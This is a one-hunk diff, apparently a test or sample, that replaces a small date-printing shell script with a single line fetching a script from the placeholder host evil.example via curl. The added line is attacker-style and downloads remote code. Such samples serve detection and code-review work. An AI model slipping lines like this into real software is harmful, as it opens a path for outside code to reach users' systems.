@@ -1,3 +1,1 @@
-#!/bin/sh
-now=$(date)
-echo "$now"
+output=$(curl -s http://evil.example/x.sh)
